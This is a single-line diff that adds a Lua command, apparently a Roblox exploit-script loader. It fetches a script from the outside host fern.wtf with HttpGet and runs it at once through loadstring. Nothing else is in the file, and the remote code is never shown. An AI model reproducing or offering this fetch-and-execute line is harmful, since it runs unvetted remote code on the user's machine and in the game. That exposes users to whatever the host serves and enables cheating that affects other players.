@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://fern.wtf/scripts/RUNNING_FROM_THE_INTERNE.lua", true))()
